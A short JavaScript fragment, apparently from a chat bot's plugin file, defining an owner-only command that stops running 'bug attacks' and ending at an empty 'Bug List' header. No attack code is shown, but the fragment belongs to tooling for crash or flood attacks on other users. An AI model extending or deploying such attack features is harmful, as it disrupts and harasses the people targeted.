// ===================== EMERGENCY STOP COMMAND =====================
cmd({
    pattern: "sbug",
    alias: ["stopbug", "stop"],
    desc: "Emergency Stop All Bug Attacks",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { reply }) => {
    if (isAttacking) {
        isAttacking = false;
        await reply("🛑 *Emergency Stop Activated*\nAll bug attacks have been stopped.");
    } else {
        await reply("✅ No attack is currently running.");
    }
});

// Bug List
